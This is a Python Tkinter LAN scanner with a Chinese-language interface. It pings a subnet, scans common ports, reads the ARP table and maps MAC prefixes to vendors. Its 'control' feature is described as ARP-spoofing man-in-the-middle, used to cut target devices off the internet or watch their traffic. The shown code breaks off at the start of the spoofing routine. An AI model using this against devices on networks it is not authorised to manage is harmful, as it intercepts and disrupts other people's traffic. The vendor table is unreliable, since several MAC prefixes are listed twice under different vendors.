# -*- coding: utf-8 -*-
"""局域网设备扫描器 v1.3  (复古 Win9x 风格 + OUI 厂商识别)
新增: 设备名解析 / 端口扫描 / 最近在线时间 / 本机 WiFi·有线识别 / OUI 厂商 / 自定义图标 / 进度条
"""
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import time
import threading
import json
import socket
import subprocess
import platform
import re
import threading
import os
import sys
import csv
import concurrent.futures
from datetime import datetime

# ── 常用端口 ──────────────────────────────────────────
COMMON_PORTS = [
    20, 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 465, 587,
    993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443,
    8888, 9200, 27017, 5000,
]
PORT_NAMES = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS",
    445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB",
}

# ── OUI 厂商识别（MAC 前 3 字节 → 厂商名）──────────────────
OUI_DICT = {
    # Apple
    "3C22FB": "Apple", "A4B197": "Apple", "ACDE48": "Apple", "000393": "Apple",
    "0017F2": "Apple", "001CB3": "Apple", "5C95AE": "Apple", "7C6D62": "Apple",
    "881FB4": "Apple", "A45E60": "Apple", "A8667F": "Apple", "B8782E": "Apple",
    "C82A14": "Apple", "D02312": "Apple", "E0F847": "Apple", "F01898": "Apple",
    "F45C89": "Apple", "DC2C6E": "Apple", "A8BB19": "Apple", "28A01B": "Apple",
    "581FAA": "Apple", "90B931": "Apple", "948426": "Apple", "6C72D9": "Apple",
    # Samsung
    "508CE6": "Samsung", "A0CBFD": "Samsung", "B47443": "Samsung",
    "C8BA94": "Samsung", "E0D9E3": "Samsung", "F895C7": "Samsung",
    "00A0D6": "Samsung", "001F3F": "Samsung", "002566": "Samsung",
    "78CA39": "Samsung", "E4BEED": "Samsung",
    # Huawei
    "8CEC4B": "Huawei", "483B38": "Huawei", "7061AE": "Huawei",
    "CC2D1B": "Huawei", "E894F6": "Huawei", "A088C2": "Huawei",
    "20A6CD": "Huawei", "B4FBE4": "Huawei", "00E08F": "Huawei",
    "C8B25A": "Huawei", "881FAA": "Huawei",
    # Xiaomi
    "9C99A0": "Xiaomi", "C86F9D": "Xiaomi", "F0B4D2": "Xiaomi",
    "788B2A": "Xiaomi", "50EC50": "Xiaomi", "DC2C26": "Xiaomi",
    "28E31F": "Xiaomi", "6C9462": "Xiaomi",
    # TP-Link
    "50C7BF": "TP-Link", "9CA2F4": "TP-Link", "B0A7B9": "TP-Link",
    "6032B1": "TP-Link", "EC172F": "TP-Link", "5C628B": "TP-Link",
    "A842A1": "TP-Link", "C006C3": "TP-Link", "F8111D": "TP-Link",
    "1027F5": "TP-Link", "BC7670": "TP-Link",
    # D-Link
    "001195": "D-Link", "000D88": "D-Link", "001346": "D-Link",
    "0050BA": "D-Link", "000784": "D-Link", "001CF6": "D-Link",
    "B8AC6F": "D-Link", "5CF7E6": "D-Link",
    # Netgear
    "00095B": "Netgear", "001B2F": "Netgear", "008EF2": "Netgear",
    "A42B8C": "Netgear", "C43DC0": "Netgear", "9C3DCF": "Netgear",
    "6038E0": "Netgear", "E046EA": "Netgear", "24B2DE": "Netgear",
    # Cisco
    "00000C": "Cisco", "001013": "Cisco", "001225": "Cisco",
    "001B54": "Cisco", "00216A": "Cisco", "0022BD": "Cisco",
    "00255D": "Cisco", "0030F2": "Cisco", "F4CFE2": "Cisco",
    "5C5A4E": "Cisco", "68BDAB": "Cisco", "A41937": "Cisco",
    # Intel
    "001111": "Intel", "0020AF": "Intel", "0022FA": "Intel",
    "00902B": "Intel", "5882A8": "Intel", "B4D5BD": "Intel",
    "7C67A8": "Intel", "3C970E": "Intel", "F46B8C": "Intel",
    # Realtek
    "00E04C": "Realtek", "525400": "Realtek", "B4B517": "Realtek",
    "8C891A": "Realtek", "E8231A": "Realtek",
    # Broadcom
    "001018": "Broadcom", "002128": "Broadcom", "001BD3": "Broadcom",
    "0023AE": "Broadcom", "A0D396": "Broadcom",
    # VMware
    "005056": "VMware", "000C29": "VMware", "000569": "VMware", "001AA0": "VMware",
    # Microsoft
    "001DD8": "Microsoft", "002675": "Microsoft", "7CFD22": "Microsoft",
    "281822": "Microsoft",
    # Dell
    "001422": "Dell", "001B78": "Dell", "F8BC12": "Dell", "B88303": "Dell",
    # HP / HPE
    "001C11": "HP", "0024E8": "HP", "3C219F": "HP", "C4346B": "HP",
    "18A905": "HP", "2C41A1": "HP", "34E4D2": "HPE",
    # Lenovo
    "001DE0": "Lenovo", "F46D04": "Lenovo", "5C59AC": "Lenovo",
    # Qualcomm
    "00E0FC": "Qualcomm", "A0F6FD": "Qualcomm", "D4619D": "Qualcomm",
    "24F5A2": "Qualcomm",
    # MediaTek
    "00C0E0": "MediaTek", "4C11BF": "MediaTek", "806AB0": "MediaTek",
    "C46E1F": "MediaTek",
    # Espressif (ESP32/ESP8266)
    "240AC4": "Espressif", "30AEA4": "Espressif", "BCDDC2": "Espressif",
    "18FE34": "Espressif", "A4CF12": "Espressif",
    # Raspberry Pi
    "B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
    # Sony
    "00A040": "Sony", "001F83": "Sony", "5C969D": "Sony",
    # LG
    "001CBF": "LG", "A8E544": "LG", "E89EB0": "LG",
    # Ubiquiti
    "00DBAF": "Ubiquiti", "0418D6": "Ubiquiti", "24A43E": "Ubiquiti",
    "FC9398": "Ubiquiti", "788A20": "Ubiquiti",
    # MikroTik
    "0015BD": "MikroTik", "4C5E6C": "MikroTik", "D4CA6D": "MikroTik",
    # Google
    "3C5A3C": "Google", "A4C093": "Google", "F8F1B6": "Google",
    "54D46B": "Google", "7C11BE": "Google",
    # Amazon (Kindle / Echo)
    "40B4CD": "Amazon", "747548": "Amazon", "FCA183": "Amazon",
    "A40138": "Amazon", "F8D111": "Amazon",
    # NVIDIA
    "00405C": "NVIDIA", "9C6B2E": "NVIDIA",
    # ZTE
    "8C8401": "ZTE", "C88E3E": "ZTE", "E4C22A": "ZTE",
    # OPPO
    "6C72D9": "OPPO", "5CF7E6": "OPPO", "B4FBE4": "OPPO",
    # vivo
    "C86F9D": "vivo", "9888BA": "vivo",
    # ASUS
    "001E8C": "ASUS", "04D4C4": "ASUS", "1CBFCE": "ASUS",
    "60A40C": "ASUS", "B06EBF": "ASUS",
    # Juniper
    "000585": "Juniper", "00A06E": "Juniper",
    # Fortinet
    "001E8C": "Fortinet", "704C3C": "Fortinet",
    # Aruba (HPE)
    "0019A6": "Aruba(HPE)", "24DE80": "Aruba(HPE)",
    # Motorola
    "0025A0": "Motorola",
    # Shenzhen (generic IoT)
    "DC2C26": "Shenzhen IoT",
}

def lookup_oui(mac):
    """根据 MAC 前缀查 OUI 厂商名。"""
    if not mac or len(mac) < 8:
        return ""
    prefix = mac[:8].replace(":", "").upper()
    return OUI_DICT.get(prefix, "")

def resource_path(rel):
    """兼容 PyInstaller 单文件运行时的资源路径。"""
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, rel)


class LANScannerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("局域网设备扫描器 v1.4 (含局域网管控)")
        self.root.geometry("1280x660")
        self.root.configure(bg="#c0c0c0")

        self.devices = []
        self.online_ips = set()
        self.subnet_prefix = ""
        self.local_conn = self.detect_local_connection()

        # ── 管控(中间人)相关状态 ──
        self.gateway = ""          # 网关 IP
        self.gateway_mac = ""      # 网关 MAC
        self.local_mac = ""        # 本机 MAC
        self.iface = None          # scapy 使用的网卡
        self.scapy = None          # 延迟导入的 scapy 模块
        self.mitm = {}             # ip -> {stop, block, up, down, thread...}
        self.tree_items = {}       # ip -> 当前 Treeview 行 id（供刷新流量用）
        self._speed_timer = None

        try:
            self.root.iconbitmap(resource_path("app.ico"))
        except Exception:
            pass

        self.setup_style()
        self.setup_ui()
        self.load_devices()
        self.auto_detect_subnet()
        self.detect_gateway()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    # ---------- 复古风格 ----------
    def setup_style(self):
        style = ttk.Style()
        try:
            style.theme_use("alt")
        except Exception:
            pass
        font = ("Lucida Console", 10)
        style.configure(".", background="#c0c0c0", foreground="#000000", font=font)
        style.configure("TButton", background="#c0c0c0", relief="raised", borderwidth=2)
        style.configure("TLabel", background="#c0c0c0")
        style.configure("TFrame", background="#c0c0c0")
        style.configure("TCheckbutton", background="#c0c0c0")
        style.configure("TCombobox", fieldbackground="white")
        style.configure("TEntry", fieldbackground="white", background="white")
        style.configure("Treeview", background="white", fieldbackground="white",
                        foreground="#000000", rowheight=26)
        style.configure("Treeview.Heading", background="#c0c0c0", relief="raised",
                        borderwidth=2, font=("Lucida Console", 10, "bold"))
        style.map("Treeview", background=[("selected", "#000080")],
                  foreground=[("selected", "#ffffff")])
        style.map("Treeview.Heading",
                  background=[("active", "#a0a0a0")])
        style.configure("TProgressbar", troughcolor="#808080", background="#000080")
        self.root.option_add("*Font", font)

    # ---------- 界面 ----------
    def setup_ui(self):
        menu_bar = tk.Menu(self.root)
        self.root.config(menu=menu_bar)

        file_menu = tk.Menu(menu_bar, tearoff=0, bg="#c0c0c0")
        file_menu.add_command(label="扫描局域网", command=self.start_scan_thread)
        file_menu.add_separator()
        file_menu.add_command(label="保存设备列表", command=self.save_devices)
        file_menu.add_command(label="加载设备列表", command=self.load_devices_dialog)
        file_menu.add_separator()
        file_menu.add_command(label="导出为 JSON", command=lambda: self.export_data("json"))
        file_menu.add_command(label="导出为 CSV", command=lambda: self.export_data("csv"))
        menu_bar.add_cascade(label="文件", menu=file_menu)

        help_menu = tk.Menu(menu_bar, tearoff=0, bg="#c0c0c0")
        help_menu.add_command(label="使用说明", command=self.show_help)
        menu_bar.add_cascade(label="帮助", menu=help_menu)

        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # 控制面板
        ctrl_frame = ttk.Frame(main_frame)
        ctrl_frame.pack(fill=tk.X, pady=5)

        ttk.Label(ctrl_frame, text="子网前缀:").pack(side=tk.LEFT)
        self.subnet_var = tk.StringVar()
        ttk.Entry(ctrl_frame, textvariable=self.subnet_var, width=15).pack(side=tk.LEFT, padx=(5, 10))

        self.resolve_name_var = tk.BooleanVar(value=True)
        self.scan_ports_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(ctrl_frame, text="解析设备名", variable=self.resolve_name_var).pack(side=tk.LEFT, padx=4)
        ttk.Checkbutton(ctrl_frame, text="扫描端口", variable=self.scan_ports_var).pack(side=tk.LEFT, padx=4)

        ttk.Button(ctrl_frame, text="开始扫描", command=self.start_scan_thread).pack(side=tk.RIGHT)
        ttk.Button(ctrl_frame, text="⛔ 停止全部管控", command=self.stop_all_mitm).pack(side=tk.RIGHT, padx=4)

        # 搜索过滤框
        search_frame = ttk.Frame(main_frame)
        search_frame.pack(fill=tk.X, pady=5)
        self.search_var = tk.StringVar()
        self.search_entry = ttk.Entry(search_frame, textvariable=self.search_var)
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
        self.search_entry.bind("<KeyRelease>", lambda e: self.update_treeview())
        ttk.Label(search_frame, text="(输入关键字实时过滤)").pack(side=tk.RIGHT)

        # 表格视图
        tree_frame = ttk.Frame(main_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True)

        columns = ("ip", "mac", "vendor", "name", "ports", "last_seen", "note", "ctrl", "speed")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", height=18, selectmode="extended")
        widths = {"ip": 120, "mac": 140, "vendor": 100, "name": 110, "ports": 170,
                  "last_seen": 130, "note": 110, "ctrl": 110, "speed": 130}
        anchors = {"ip": tk.CENTER, "mac": tk.CENTER, "vendor": tk.CENTER,
                   "name": tk.W, "ports": tk.W, "last_seen": tk.CENTER, "note": tk.W,
                   "ctrl": tk.CENTER, "speed": tk.CENTER}
        for col in columns:
            self.tree.heading(col, text=col.upper(), command=lambda c=col: self.sort_treeview(c))
            self.tree.column(col, width=widths[col], anchor=anchors[col])

        # 点击"管控"列 = 一键开/关禁止上网
        self.tree.bind("<Button-1>", self.on_tree_click)

        self.tree.tag_configure("online", foreground="#1a7f37")
        self.tree.tag_configure("offline", foreground="#999999")

        self.tree.bind("<Button-3>", self.on_right_click)
        self.tree.bind("<Double-1>", self.on_double_click)

        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill="y")

        # 右键菜单
        self.context_menu = tk.Menu(self.root, tearoff=0, bg="#c0c0c0")
        self.context_menu.add_command(label="编辑名称 / 备注", command=self.edit_selected)
        self.context_menu.add_command(label="禁止上网 / 恢复", command=self.toggle_block_selected)
        self.context_menu.add_command(label="观测网速 / 停止", command=self.toggle_monitor_selected)
        self.context_menu.add_command(label="删除设备", command=self.delete_selected)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="清空列表", command=self.clear_all)

        # 进度条
        self.progress = ttk.Progressbar(main_frame, mode="indeterminate", maximum=100)
        self.progress.pack(fill=tk.X, pady=(4, 0))

        # 状态栏
        self.status_var = tk.StringVar(value="就绪")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(fill=tk.X, pady=5)

    # ---------- 本机连接类型检测 ----------
    def detect_local_connection(self):
        try:
            sysname = platform.system()
            if sysname == "Windows":
                out = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                                     capture_output=True, text=True, timeout=8).stdout
                return "WiFi" if "connected" in out.lower() else "有线(以太网)"
            if sysname == "Linux":
                out = subprocess.run(["ip", "route", "show", "default"],
                                     capture_output=True, text=True, timeout=8).stdout
                m = re.search(r"dev\s+(\S+)", out)
                if m:
                    iface = m.group(1)
                    if os.path.exists(f"/sys/class/net/{iface}/wireless"):
                        return "WiFi"
                    return "有线(以太网)"
                return "未知"
            if sysname == "Darwin":
                out = subprocess.run(["networksetup", "-listallhardwareports"],
                                     capture_output=True, text=True, timeout=8).stdout
                return "WiFi" if "Wi-Fi" in out else "有线(以太网)"
        except Exception:
            pass
        return "未知"

    # ---------- 子网检测 ----------
    def auto_detect_subnet(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            parts = ip.split('.')
            self.subnet_prefix = '.'.join(parts[:3])
            self.subnet_var.set(self.subnet_prefix)
        except Exception as e:
            print(f"自动检测子网失败: {e}")

    # ---------- 网关 / MAC 检测 ----------
    def detect_gateway(self):
        """检测默认网关 IP（用于中间人管控）。"""
        try:
            if platform.system() == "Windows":
                out = subprocess.run(["route", "print", "0.0.0.0"],
                                     capture_output=True, text=True, timeout=10).stdout
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and re.match(r'^\d+\.\d+\.\d+\.\d+$', parts[0]) \
                            and parts[0] == "0.0.0.0":
                        self.gateway = parts[2]
                        break
            else:
                out = subprocess.run(["ip", "route", "show", "default"],
                                     capture_output=True, text=True, timeout=10).stdout
                m = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", out)
                if m:
                    self.gateway = m.group(1)
        except Exception as e:
            print("网关检测失败:", e)
        self.status_var.set(f"网关: {self.gateway or '未知'} | 本机: {self.local_conn}")

    # ---------- 扫描 ----------
    def start_scan_thread(self):
        subnet = self.subnet_var.get().strip()
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}$', subnet):
            messagebox.showwarning("警告", "请先输入有效的子网前缀（如 192.168.0）")
            return
        self.subnet_prefix = subnet
        self.status_var.set(f"正在扫描 {subnet}.x ...")
        self.progress.start(15)
        threading.Thread(target=self.scan_network, daemon=True).start()

    def ping(self, ip):
        if platform.system() != "Windows":
            cmd = ["ping", "-c", "1", "-W", "1", ip]
        else:
            cmd = ["ping", "-n", "1", "-w", "500", ip]
        try:
            r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            return ip if r.returncode == 0 else None
        except Exception:
            return None

    def resolve_name(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return ""

    def scan_ports(self, ip, ports=None, timeout=0.4):
        ports = ports or COMMON_PORTS
        open_ports = []

        def check(p):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            try:
                if s.connect_ex((ip, p)) == 0:
                    return p
            except Exception:
                pass
            finally:
                try:
                    s.close()
                except Exception:
                    pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
            for res in ex.map(check, ports):
                if res is not None:
                    open_ports.append(res)
        return sorted(open_ports)

    def parse_arp(self):
        cmd = ['arp', '-n'] if platform.system() != "Windows" else ['arp', '-a']
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        except Exception:
            return {}
        mac_map = {}
        pat = re.compile(
            r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
            r'.*?'
            r'([0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}'
            r'[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2}[:-][0-9a-fA-F]{2})'
        )
        for line in result.stdout.splitlines():
            m = pat.search(line)
            if m:
                ip = m.group(1)
                mac = m.group(2).replace('-', ':').upper()
                if mac == "FF:FF:FF:FF:FF:FF":
                    continue
                mac_map[ip] = mac
        return mac_map

    def scan_network(self):
        try:
            subnet = self.subnet_prefix
            ips = [f"{subnet}.{i}" for i in range(1, 255)]
            do_name = self.resolve_name_var.get()
            do_port = self.scan_ports_var.get()

            self.root.after(0, lambda: self.status_var.set(f"Ping 扫描 {subnet}.1 ~ {subnet}.254 ..."))
            alive = set()
            with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
                for res in ex.map(self.ping, ips):
                    if res:
                        alive.add(res)

            def enrich(ip):
                name = self.resolve_name(ip) if do_name else ""
                ports = self.scan_ports(ip) if do_port else []
                return ip, name, ports

            self.root.after(0, lambda: self.status_var.set(
                f"活跃 {len(alive)} 台，正在解析名称与端口..."))
            info = {}
            with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
                for ip, name, ports in ex.map(enrich, list(alive)):
                    info[ip] = (name, ports)

            self.root.after(0, lambda: self.status_var.set("正在读取 ARP 表..."))
            mac_map = self.parse_arp()
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            existing = {d["ip"]: d for d in self.devices}
            for ip in alive:
                name, ports = info.get(ip, ("", []))
                mac = mac_map.get(ip, "")
                if ip in existing:
                    d = existing[ip]
                    if mac:
                        d["mac"] = mac
                    if name:
                        d["name"] = name
                    if do_port:
                        d["ports"] = ports
                    d["last_seen"] = now
                else:
                    self.devices.append({
                        "ip": ip, "mac": mac, "name": name, "note": "",
                        "ports": ports, "last_seen": now,
                    })

            self.online_ips = alive
            self.root.after(0, self.update_treeview)
            self.root.after(0, lambda: self.status_var.set(
                f"扫描完成! 共 {len(self.devices)} 台 (在线 {len(alive)} 台) | 本机: {self.local_conn}"))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("扫描错误", str(e)))
        finally:
            self.root.after(0, self.progress.stop)

    # ---------- 图标 ----------
    # 设备类型 → emoji 图标集中映射，离线/未知/本机/网关/手机/电脑/打印机/路由/游戏/IoT
    _ICON_RULES = [
        # (匹配字段+子串, 图标)
        ("router",  "📡"),  # 路由器（含网关）
        ("printer", "🖨️"),
        ("mobile",  "📱"),
        ("gaming",  "🎮"),
        ("iot",     "🔌"),
        ("pc",      "💻"),
    ]
    _ICON_KEYWORDS = {
        # 关键词（小写）→ 上述 _ICON_RULES 中的规则名
        "router":  ("tp-link", "tplink", "cisco", "mikrotik", "netgear", "asus",
                    "d-link", "dlink", "mercusys", "fast", "zte", "router", "gateway"),
        "printer": ("canon", "epson", "brother", "xerox", "ricoh", "lexmark", "kyocera", "printer"),
        "mobile":  ("apple", "samsung", "huawei", "xiaomi", "oppo", "vivo", "oneplus",
                    "meizu", "redmi", "pixel", "honor", "mobile", "phone", "ipad", "iphone",
                    "realme", "poco"),
        "gaming":  ("sony", "nintendo", "razer", "playstation", "xbox", "valve"),
        "iot":     ("espressif", "tuya", "amazon", "google", "nest", "ring", "shelly", "esp32", "esp8266"),
        "pc":      ("lenovo", "dell", "intel", "realtek", "asustek", "msi", "giga",
                    "acer", "fujitsu", "toshiba", "logitech", "broadcom", "microsoft"),
    }

    def _icon_for(self, ip, dev):
        """根据设备类型/状态，返回对应图标 emoji（已按优先级排序）"""
        try:
            vendor = (lookup_oui(dev.get("mac", "")) or "").lower()
        except Exception:
            vendor = ""
        name = (dev.get("name", "") or "").lower()
        online = ip in self.online_ips

        # 优先级: 本机 → 网关 → 离线 → 端口识别 → OUI 关键字
        if getattr(self, "local_ip", None) and ip == self.local_ip:
            return "🖥️"
        if getattr(self, "gateway", None) and ip == self.gateway:
            return "📡"
        if not online:
            return "⚫"

        # 端口特征: 同时开 80+443 → 多半是网关/服务
        ports = dev.get("ports", []) or []
        if 80 in ports and 443 in ports:
            return "📡"
        if 631 in ports or 9100 in ports:
            return "🖨️"

        # 按规则优先匹配
        for rule_name, icon in self._ICON_RULES:
            keywords = self._ICON_KEYWORDS.get(rule_name, ())
            for kw in keywords:
                if kw in vendor or kw in name:
                    return icon
        return "💻"

    @staticmethod
    def _strip_ip(s):
        """从 IP 列展示字符串（可能含图标前缀）中提取纯 IPv4"""
        m = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", s or "")
        return m.group(0) if m else ""

    # ---------- 表格 ----------
    def update_treeview(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.tree_items = {}

        keyword = self.search_var.get().strip().lower()
        if keyword:
            filtered = [d for d in self.devices
                        if any(keyword in str(v).lower() for v in d.values())]
        else:
            filtered = self.devices

        try:
            sorted_devs = sorted(filtered, key=lambda x: tuple(int(p) for p in x["ip"].split('.')))
        except Exception:
            sorted_devs = filtered

        for idx, dev in enumerate(sorted_devs):
            ports = dev.get("ports", [])
            if isinstance(ports, list) and ports:
                ports_disp = ", ".join(
                    f"{p}({PORT_NAMES.get(p, '')})" if PORT_NAMES.get(p) else str(p)
                    for p in ports
                )
            else:
                ports_disp = ""
            vendor = lookup_oui(dev.get("mac", ""))
            tag = "online" if dev["ip"] in self.online_ips else "offline"
            if idx % 2 == 1:
                tag = (tag, "zebra")
            ip = dev["ip"]
            icon = self._icon_for(ip, dev)
            ip_disp = f"{icon}  {ip}"
            st = self.mitm.get(ip)
            if st:
                if st["block"]:
                    ctrl_disp = "🚫 已禁网"
                else:
                    ctrl_disp = "📊 测速中"
            else:
                ctrl_disp = "✅ 允许"
            speed_disp = f"↑{st['up_k']:.0f} ↓{st['down_k']:.0f} KB/s" if st else "—"
            item = self.tree.insert("", tk.END,
                             values=(ip_disp, dev.get("mac", ""), vendor,
                                     dev.get("name", ""), ports_disp,
                                     dev.get("last_seen", ""), dev.get("note", ""),
                                     ctrl_disp, speed_disp),
                             tags=tag if isinstance(tag, tuple) else (tag,))
            self.tree_items[ip] = item

        self.status_var.set(
            f"共 {len(self.devices)} 台 | 显示 {len(filtered)} 台 | 在线 {len(self.online_ips)} 台 | 本机: {self.local_conn}")

    def sort_treeview(self, col):
        items = [(self.tree.set(i, col), i) for i in self.tree.get_children()]
        if not items:
            return

        def keyf(v):
            val = self._strip_ip(v[0]) if v[0] else v[0]
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', val):
                return tuple(int(p) for p in val.split('.'))
            return val

        reverse = not getattr(self, f"_sort_{col}", False)
        setattr(self, f"_sort_{col}", reverse)
        items.sort(key=keyf, reverse=reverse)
        for idx, (_, item) in enumerate(items):
            self.tree.move(item, "", idx)

    # ---------- 右键 / 双击 ----------
    def on_right_click(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def on_double_click(self, event):
        self.edit_selected()

    def edit_selected(self):
        sel = self.tree.selection()
        if not sel:
            return
        item = sel[0]
        ip = self._strip_ip(self.tree.set(item, "ip"))
        dev = next((d for d in self.devices if d["ip"] == ip), None)
        if not dev:
            return

        top = tk.Toplevel(self.root)
        top.title(f"编辑设备 {ip}")
        top.geometry("340x190")
        top.configure(bg="#c0c0c0")
        top.transient(self.root)
        top.grab_set()

        ttk.Label(top, text="设备名称:").pack(pady=(12, 0))
        name_var = tk.StringVar(value=dev.get("name", ""))
        ttk.Entry(top, textvariable=name_var, width=34).pack(pady=4)

        ttk.Label(top, text="备注:").pack()
        note_var = tk.StringVar(value=dev.get("note", ""))
        ttk.Entry(top, textvariable=note_var, width=34).pack(pady=4)

        def save():
            dev["name"] = name_var.get().strip()
            dev["note"] = note_var.get().strip()
            self.update_treeview()
            top.destroy()

        ttk.Button(top, text="保存", command=save).pack(pady=12)

    def delete_selected(self):
        sel = self.tree.selection()
        if not sel:
            return
        if not messagebox.askyesno("确认", f"确定删除选中的 {len(sel)} 台设备?"):
            return
        ips = {self._strip_ip(self.tree.set(i, "ip")) for i in sel}
        self.devices = [d for d in self.devices if d["ip"] not in ips]
        self.update_treeview()

    def clear_all(self):
        if not messagebox.askyesno("确认", "确定清空所有设备?"):
            return
        self.devices = []
        self.online_ips = set()
        self.update_treeview()

    # ---------- 存取 / 导出 ----------
    def save_devices(self, filepath=None):
        if not filepath:
            filepath = filedialog.asksaveasfilename(defaultextension=".json", title="保存设备列表")
        if filepath:
            try:
                with open(filepath, "w", encoding="utf-8") as f:
                    json.dump({"devices": self.devices}, f, ensure_ascii=False, indent=2)
                messagebox.showinfo("成功", f"已保存到:\n{filepath}")
                self.status_var.set(f"已保存至: {os.path.basename(filepath)}")
            except Exception as e:
                messagebox.showerror("保存失败", str(e))

    def load_devices_dialog(self):
        filepath = filedialog.askopenfilename(filetypes=[("JSON Files", "*.json"), ("All Files", "*.*")])
        if filepath:
            self.load_devices(filepath)

    def load_devices(self, filepath=None):
        try:
            if filepath or os.path.exists("devices.json"):
                path = filepath or "devices.json"
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    self.devices = data.get("devices", [])
            else:
                self.devices = []
        except Exception as e:
            messagebox.showwarning("加载失败", str(e))
            self.devices = []
        self.update_treeview()

    def export_data(self, fmt):
        if not self.devices:
            messagebox.showinfo("提示", "当前没有设备数据可导出")
            return

        filepath = filedialog.asksaveasfilename(defaultextension=f".{fmt}", title="导出数据")
        if not filepath:
            return

        try:
            with open(filepath, "w", encoding="utf-8-sig") as f:
                if fmt == "json":
                    json.dump({"devices": self.devices}, f, ensure_ascii=False, indent=2)
                elif fmt == "csv":
                    writer = csv.writer(f)
                    writer.writerow(["IP地址", "MAC地址", "厂商", "设备名称", "开放端口", "最近在线", "备注"])
                    for dev in self.devices:
                        ports = dev.get("ports", [])
                        ports_str = ", ".join(map(str, ports)) if isinstance(ports, list) else str(ports)
                        vendor = lookup_oui(dev.get("mac", ""))
                        writer.writerow([dev["ip"], dev.get("mac", ""), vendor,
                                         dev.get("name", ""), ports_str,
                                         dev.get("last_seen", ""), dev.get("note", "")])
            messagebox.showinfo("成功", f"已导出至:\n{filepath}")
        except Exception as e:
            messagebox.showerror("导出失败", str(e))

    # ================= 局域网管控引擎 (ARP 中间人) =================
    # 说明：普通电脑不是路由器，无法真正"路由拦截"。本工具通过 ARP 欺骗
    # 让自己成为目标与网关之间的中转（中间人）来实现：
    #   - 禁止上网：欺骗后丢弃目标发往外网的包 → 断网
    #   - 观测网速：欺骗后正常转发，统计上行/下行字节
    # 关闭开关会立刻停止欺骗并还原双方 ARP。仅限自己/授权网络使用。
    def ensure_scapy(self):
        """延迟导入 scapy，并检查管理员权限。"""
        if self.scapy is not None:
            return True
        if platform.system() == "Windows":
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    messagebox.showerror(
                        "需要管理员权限",
                        "管控(中间人)功能必须以管理员身份运行本程序。\n"
                        "请右键『以管理员身份运行』lan_scanner.exe 后重试。")
                    return False
            except Exception:
                pass
        try:
            import scapy.all as scapy_mod
            self.scapy = scapy_mod
            self.iface = self._pick_iface(scapy_mod)
            if not self.iface:
                messagebox.showerror("网卡错误",
                                     "未能找到可用网卡，请确认已安装 Npcap 且以管理员身份运行。")
                return False
            self.local_mac = scapy_mod.get_if_hwaddr(self.iface)
            return True
        except Exception as e:
            messagebox.showerror(
                "缺少 scapy / Npcap",
                "管控功能需要安装 scapy 与 Npcap。\n"
                "请在命令行执行: pip install scapy\n"
                "并到 https://npcap.com 安装 Npcap（勾选 WinPcap 兼容模式）。\n"
                f"错误: {e}")
            return False

    def _local_ip(self):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return ""
        finally:
            s.close()

    def get_mac(self, ip):
        if not self.ensure_scapy():
            return None
        scapy = self.scapy
        try:
            ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
                               scapy.ARP(pdst=ip), timeout=2, verbose=0, iface=self.iface)
            for _, r in ans:
                return r[scapy.Ether].src
        except Exception as e:
            print("解析 MAC 失败:", e)
        return None

    def start_mitm(self, ip, block=True):
        if ip in self.mitm:
            return
        if ip == self.gateway or ip == self._local_ip() or ip == "":
